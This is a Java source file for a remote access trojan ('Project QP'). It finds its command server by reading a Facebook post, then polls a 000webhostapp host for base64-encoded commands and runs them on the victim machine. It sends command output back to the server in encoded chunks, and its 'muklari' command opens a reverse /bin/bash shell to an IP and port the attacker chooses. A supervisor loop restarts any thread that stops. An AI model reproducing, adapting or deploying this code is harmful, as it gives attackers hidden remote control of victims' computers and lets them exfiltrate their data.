/**
 * toSet: https://filmslinks.000webhostapp.com/a.php?a=ls
 * Dictionary: https://filmslinks.000webhostapp.com/cmds
 * Author: Awcator
 * Version: 1.0
 * Project QP
 */

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;

public class main {
    //TimeDelay to reTry connect to facebook
    public static String pwd = System.getProperty("user.dir");
    public static Thread t1, t2, t22;
    public static final int fb_retry = 10 * 1000;
    public static final short cmd_retry = 3 * 1000;

    public static final String dictionary = "/cmds";
    public static final String addCommand = "/a.php?a=";
    public static final String istream = "/sstdin.php?a=";
    public static final String ostream = "/stdout.php?a=";
    public static final String flush = "/flush.php?a=";
    //String URL to connect to CommandExecution Environment
    public static String CE_URL = "";

    public static boolean kill = false;

    public synchronized static String readWeb(String url) throws Exception {
        BufferedReader in = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
        String str = "", temp;
        while ((temp = in.readLine()) != null) {
            str += temp + "\n";
        }
        return str;
    }

    /**
     * Reads the facebook post and returns the scriptable url link
     *
     * @return Returns the URL
     * @throws Exception
     */
    public static String contactFBandGetLink() throws Exception {
        URL url = new URL("https://mbasic.facebook.com/story.php?story_fbid=136885790867331&id=100036377325742&refid=17&__tn__=%2AW-R&_rdr");
        String str;
        str = readWeb(url.toString());
        int b = str.indexOf("6619");
        int e = str.indexOf("6619", b + 1);
        System.gc();
        return str.substring(b + 4, e - 1);
    }

    /**
     * Thread class to loadUp Links
     */
    public static class checkForLinks implements Runnable {
        @Override
        public void run() {
            try {
                Thread.sleep(fb_retry);
                main.CE_URL = main.contactFBandGetLink();
            } catch (Exception e) {
            }
        }
    }

    public static class commandInterpreterThread implements Runnable {
        private int identifier;

        public commandInterpreterThread(int z) {
            identifier = z;
        }

        @Override
        public void run() {
            String commands = null, args[] = null;
            try {
                Thread.sleep(main.cmd_retry);
                boolean noError = true, done = false;
                if (main.CE_URL.length() >= 2) {
                    while (done == false) {
                        try {
                            commands = new String(DatatypeConverter.parseBase64Binary(readWeb(CE_URL + dictionary).trim())).trim();
                            args = commands.split("SPACE");
                            done = true;
                        } catch (Exception e) {
                            done = false;
                        }
                    }
                    System.gc();
                    if (commands.startsWith("cd") && identifier == 2) {
                        if (new File(args[1]).exists() && new File(args[1]).exists())
                            System.setProperty("user.dir", args[1]);
                    } else if (commands.equalsIgnoreCase("reset") && identifier == 2) {
                        kill = true;
                        main.t1 = null;
                        main.t2 = null;
                        System.gc();
                        main.t1 = new Thread(new checkForLinks());
                        main.t2 = new Thread(new commandInterpreterThread(1));
                        main.t1.start();
                        main.t2.start();
                        Thread.sleep(500);
                        System.gc();
                    } else if (commands.equalsIgnoreCase("exit") && identifier == 2) {
                        System.exit(0);
                    } else {
                        if (identifier == 1 && args.length >= 1 && args[0].trim().length() >= 1 && !args[0].equalsIgnoreCase("cd") && !args[0].equalsIgnoreCase("reset"))
                            main.execute(args);
                    }
                }
            } catch (Exception e) {
            }
        }
    }

    //Muklari /bin/bash ip port
    public static void execute(String... cmd) {
        if (cmd[0].equalsIgnoreCase("muklari")) {
            Socket s = null;
            try {
                String comd = cmd[1];
                Process p = new ProcessBuilder(comd).redirectErrorStream(true).start();
                s = new Socket(cmd[2], Integer.parseInt(cmd[3]));
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0)
                        so.write(pi.read());
                    while (pe.available() > 0)
                        so.write(pe.read());
                    while (si.available() > 0)
                        po.write(si.read());
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                    }
                }
                p.destroy();
                s.close();
                p = null;
                s = null;
                System.gc();
            } catch (Exception e) {
            } finally {
                try {
                    readWeb(CE_URL + flush + "cmds");
                    s.close();
                } catch (Exception e) {
                }
            }
        } else {
            Process p = null;
            try {
                ProcessBuilder pb = new ProcessBuilder(cmd);
                pb.redirectErrorStream(true);
                pb.directory(new File(System.getProperty("user.dir")));
                p = pb.start();
                InputStream pi = p.getInputStream(), pe = p.getErrorStream();
                OutputStream po = p.getOutputStream();
                p.waitFor();
                try {
                    String s = "";
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();

                    int nRead;
                    byte[] data = new byte[6555536];

                    while ((nRead = pi.read(data, 0, data.length)) != -1) {
                        buffer.write(data, 0, nRead);
                    }

                    while (pi.available() > 0 && !main.kill) {
                        char x = (char) pi.read();
                        s += x;
                    }

                    while (pe.available() > 0 && !main.kill) {
                        char x = (char) pi.read();
                        s += x;
                    }
                    readWeb(CE_URL + flush + "stdin");
                    s = DatatypeConverter.printBase64Binary(buffer.toByteArray());
                    int jump = 5000;
                    try {
                        for (int i = 0; i < s.length(); i = i + jump) {
                            try {
                                String x = s.substring(i, i + jump);
                                readWeb(CE_URL + istream + URLEncoder.encode(s.substring(i, i + jump), "UTF-8"));
                            } catch (StringIndexOutOfBoundsException se) {
                                readWeb(CE_URL + istream + URLEncoder.encode(s.substring(i), "UTF-8"));
                            }
                        }
                        readWeb(CE_URL + flush + "cmds");
                    } catch (javax.net.ssl.SSLHandshakeException e) {
                    }
                    if (main.kill == true) {
                        p.destroy();
                        p.exitValue();
                        pi.close();
                        po.close();
                        kill = !kill;
                    }
                    po.flush();
                    Thread.sleep(50);
                    p.exitValue();
                    pi.close();
                    po.close();
                } catch (Exception e) {
                }
                p.destroy();
            } catch (Exception e) {
                try {
                    readWeb(CE_URL + flush + "cmds");
                    p.destroy();
                } catch (Exception ex) {
                }
            }
        }
    }

    public static void main(String args[]) throws Exception {
        main sMain = new main();
        sMain.t1 = new Thread(new checkForLinks());
        sMain.t2 = new Thread(new commandInterpreterThread(1));
        sMain.t22 = new Thread(new commandInterpreterThread(2));
        while (true) {
            if (!sMain.t1.isAlive()) {
                sMain.t1 = null;
                System.gc();
                sMain.t1 = new Thread(new checkForLinks());
                sMain.t1.start();
            }
            if (!sMain.t2.isAlive()) {
                sMain.t2 = null;
                System.gc();
                sMain.t2 = new Thread(new commandInterpreterThread(1));
                sMain.t2.start();
            }
            if (!sMain.t22.isAlive()) {
                sMain.t22 = null;
                System.gc();
                sMain.t22 = new Thread(new commandInterpreterThread(2));
                sMain.t22.start();
            }
            Thread.sleep(1000);
        }
    }
}
